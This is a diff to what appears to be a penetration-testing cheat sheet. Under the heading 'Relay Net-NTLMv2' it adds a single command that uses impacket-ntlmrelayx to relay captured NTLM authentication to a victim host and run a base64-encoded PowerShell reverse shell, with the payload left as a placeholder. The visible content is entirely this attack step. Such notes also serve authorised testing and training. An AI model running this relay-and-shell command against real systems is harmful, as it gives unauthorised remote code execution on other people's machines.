@@ -88,7 +88,6 @@ then `hashcat`
 
 ## Relay Net-NTLMv2
 
-
 ```
-
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t IpVictim -c "powershell -enc base64reverseshell"
 ```
